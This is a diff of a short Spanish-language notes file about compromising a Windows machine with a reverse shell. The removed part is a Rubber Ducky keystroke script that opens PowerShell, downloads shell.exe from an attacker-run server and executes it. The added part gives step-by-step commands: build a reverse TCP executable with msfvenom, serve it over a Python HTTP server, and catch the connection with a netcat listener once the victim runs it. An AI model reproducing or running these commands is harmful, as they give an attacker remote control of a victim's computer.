@@ -1,14 +1,12 @@
-GUIA DE ELABORACIÖN:
-payload del rubber:
-REM Script actualizado con la ruta de la carpeta
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 1000
-STRING Invoke-WebRequest -Uri "http://ip:8000/shell.exe" -OutFile "$env:TEMP/shell.exe"
-ENTER
-DELAY 1000
-STRING Start-Process "$env:TEMP/shell.exe"
-ENTER
+Pasos para realizar el reverse shell:
+1. Generar shell:
+- Creas una carpeta llamada "shellmalo".
+- Luego: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.223.128 LPORT=4444 -f exe > shellmalo/shell.exe
+2. Correr server:
+- cd shellmalo
+- python -m http.server 8000
+3. Listener de netcat:
+- Abre otra terminal
+- nc -lvnp 4444
+4. Acción: Una vez ejecutado la shell en la victima, accedes en donde estas corriendo netcat.
+ 
